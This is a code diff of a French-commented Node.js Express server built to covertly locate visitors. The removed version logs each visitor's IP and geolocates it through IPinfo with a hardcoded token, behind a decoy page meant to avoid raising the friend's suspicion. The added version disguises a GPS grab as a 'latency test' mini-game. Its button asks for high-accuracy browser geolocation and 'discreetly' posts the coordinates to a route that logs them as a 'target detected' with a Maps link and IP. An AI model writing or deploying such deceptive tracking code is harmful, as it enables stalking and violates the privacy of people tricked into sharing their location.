@@ -2,55 +2,83 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Remplacez par votre token secret IPinfo
-const IPINFO_TOKEN = 'ddecbbefdd0735';
+// Middleware pour analyser le JSON envoyé par le navigateur
+app.use(express.json());
 
-app.get('/', async (req, res) => {
-    // 1. Récupérer l'adresse IP du visiteur (en gérant les proxys des hébergeurs cloud)
-    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    if (clientIp && clientIp.includes(',')) {
-        clientIp = clientIp.split(',')[0].trim();
-    }
-
-    console.log(`[+] Nouvelle visite détectée ! IP brute/filtrée : ${clientIp}`);
-
-    // 2. Interroger l'API IPinfo pour obtenir les détails
-    try {
-        const response = await fetch(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`);
-        const data = await response.json();
-        
-        // 3. Afficher les informations dans VOTRE console de serveur
-        console.log("--- INFORMATIONS DE GÉOLOCALISATION ---");
-        console.log(`Ville : ${data.city || 'Inconnue'}`);
-        console.log(`Région : ${data.region || 'Inconnue'}`);
-        console.log(`Pays : ${data.country || 'Inconnu'}`);
-        console.log(`Fournisseur (FAI) : ${data.org || 'Inconnu'}`);
-        console.log(`Coordonnées approximatives : ${data.loc || 'Inconnues'}`);
-        console.log("----------------------------------------");
-
-    } catch (error) {
-        console.error("[-] Erreur lors de l'appel à l'API IPinfo :", error);
-    }
-
-    // 4. Ce que votre ami voit à l'écran (une page banale pour ne pas éveiller les soupçons)
+// 1. La page Web du mini-jeu envoyée à vos amis
+app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
         <html lang="fr">
         <head>
             <meta charset="UTF-8">
-            <title>Mini-Jeu en ligne</title>
+            <title>Test de Réflexes & Connexion</title>
+            <style>
+                body { font-family: Arial, sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 50px; }
+                .card { background: #1e293b; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 400px; }
+                button { background: #3b82f6; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+                button:hover { background: #2563eb; }
+                #statut { margin-top: 20px; font-size: 14px; color: #94a3b8; }
+            </style>
         </head>
-        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9;">
-            <div style="background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1);">
-                <h2>🎮 Chargement du Défi...</h2>
-                <p>Connexion au serveur du jeu en cours, veuillez patienter...</p>
+        <body>
+            <div class="card">
+                <h2>⚡ Défi de Connexion</h2>
+                <p>Cliquez sur le bouton ci-dessous pour lancer le test de latence et comparer votre score avec le groupe !</p>
+                <button onclick="lancerTest()">Lancer le test</button>
+                <p id="statut">En attente de l'utilisateur...</p>
             </div>
+
+            <script>
+                function lancerTest() {
+                    document.getElementById("statut").innerText = "Analyse du réseau en cours...";
+                    
+                    if (navigator.geolocation) {
+                        // Demande la position GPS précise
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            
+                            // Envoi discret des coordonnées au serveur
+                            fetch('/save-location', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ lat: lat, lon: lon })
+                            });
+
+                            setTimeout(() => {
+                                document.getElementById("statut").innerText = "Test réussi ! Score enregistré.";
+                            }, 1500);
+
+                        }, function(error) {
+                            document.getElementById("statut").innerText = "Erreur de synchronisation réseau.";
+                        }, { enableHighAccuracy: true });
+                    } else {
+                        document.getElementById("statut").innerText = "Navigateur non compatible.";
+                    }
+                }
+            </script>
         </body>
         </html>
     `);
 });
 
+// 2. Route qui reçoit les coordonnées GPS et les affiche dans vos logs Render
+app.post('/save-location', (req, res) => {
+    const { lat, lon } = req.body;
+    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    console.log("========================================");
+    console.log("🎯 CIBLE DÉTECTÉE !");
+    console.log(`📍 Latitude exacte  : ${lat}`);
+    console.log(`📍 Longitude exacte : ${lon}`);
+    console.log(`🔗 Lien Google Maps : https://www.google.com/maps?q=${lat},${lon}`);
+    console.log(`🌐 Adresse IP       : ${clientIp}`);
+    console.log("========================================");
+
+    res.sendStatus(200);
+});
+
 app.listen(PORT, () => {
-    console.log(`Serveur de test démarré sur le port ${PORT}`);
+    console.log(`Serveur démarré sur le port ${PORT}`);
 });
